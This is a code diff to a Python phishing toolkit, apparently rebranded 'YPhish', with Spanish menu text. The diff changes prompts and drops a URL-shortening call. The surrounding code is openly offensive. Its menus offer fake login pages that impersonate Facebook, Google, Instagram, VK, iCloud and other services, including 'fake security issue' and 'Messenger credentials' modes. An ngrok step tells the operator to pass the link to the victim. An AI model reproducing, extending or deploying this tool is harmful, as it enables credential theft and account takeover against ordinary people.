@@ -700,11 +700,11 @@ def runPEnv(): #menu where user select what they wanna use
     option = input("\nSekecciona una opcion:\n\n 1 Facebook\n\n 2 Google\n\n 3 LinkedIn\n\n 4 GitHub\n\n 5 StackOverflow\n\n 6 WordPress\n\n 7 Twitter\n\n 8 Instagram\n\n 9 Snapchat\n\n 10 Yahoo\n\n 11 Twitch\n\n 12 Microsoft\n\n 13 Steam\n\n 14 VK\n\n 15 iCloud\n\n ")
     if option == '1':
         loadModule('Facebook')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Pagina Standard\n\n 2 Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Pagina Standard\n\n 2 Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}YPhish > {1}".format(CYAN, DEFAULT))
         runPhishing('Facebook', option2)
     elif option == '2':
         loadModule('Google')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Pagina Standard\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Pagina Standard\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} \n\n {0}YPhish > {1}".format(CYAN, DEFAULT))
         runPhishing('Google', option2)
     elif option == '3':
         loadModule('LinkedIn')
@@ -728,7 +728,7 @@ def runPEnv(): #menu where user select what they wanna use
         runPhishing('Twitter', option2)
     elif option == '8':
         loadModule('Instagram')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}------------->{0}]{1} \n\n {0}YPhish > {1}".format(CYAN, DEFAULT))
         runPhishing('Instagram', option2)
     elif option == '9':
         loadModule('Snapchat')
@@ -752,7 +752,7 @@ def runPEnv(): #menu where user select what they wanna use
         runPhishing('Steam', option2)
     elif option == '14':
         loadModule('VK')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}------------->{0}]{1} \n\n {0}YPhish > {1}".format(CYAN, DEFAULT))
         runPhishing('VK', option2)
     elif option == '15':
         loadModule('iCloud')
@@ -771,8 +771,6 @@ def runNgrok():
         urlFile.close()
         if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
             print("\n [+]Url de Ngrok : " + url + "\n Pasa el link a la victima para el ataque")
-            link = check_output("curl -s 'http://tinyurl.com/api-create.php?url='"+url, shell=True).decode().replace('http', 'https')
-            print("\n [+]Url acortada : " + link + "\n")
             break
 
 
